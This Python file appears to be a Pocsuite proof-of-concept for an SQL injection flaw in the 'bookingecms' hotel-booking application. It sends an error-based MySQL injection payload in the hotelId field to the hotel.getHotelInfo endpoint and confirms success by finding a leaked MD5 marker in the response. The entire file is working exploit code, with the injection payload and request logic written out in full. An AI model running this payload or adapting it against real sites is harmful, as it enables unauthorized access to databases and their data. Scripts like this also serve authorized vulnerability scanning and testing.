#!/usr/bin/env python
# coding: utf-8
import re
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = ' '
    author = ['']
    vulDate = ''
    createDate = '2016-09-19'
    updateDate = '2016-09-19'
    references = ['http://wooyun.org/bugs/wooyun-2015-0105242']
    name = 'bookingecms_rewrite_sql 注入漏洞'
    appPowerLink = ''
    appName = 'bookingecms'
    appVersion = ''
    vulType = ''
    desc = '''
    bookingecms_rewrite_sql 注入漏洞
    '''
    samples = ['']
    install_requires = ['']
    

    def _attack(self):
        result = {}
        self._verify()

    def _verify(self):
        result = {}
        vulurl = "%s/?m=hotel.getHotelInfo" % self.url
        payload = {"hotelId":"11 AND (SELECT 6261 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(MD5(3.14) AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}
        resp = req.post(vulurl,data = payload,timeout =15)
        re_result = re.findall(r'~~~(.*?)~~~', resp.content, re.S|re.I)
        if re_result:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
            result['VerifyInfo']['Payload'] = payload

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
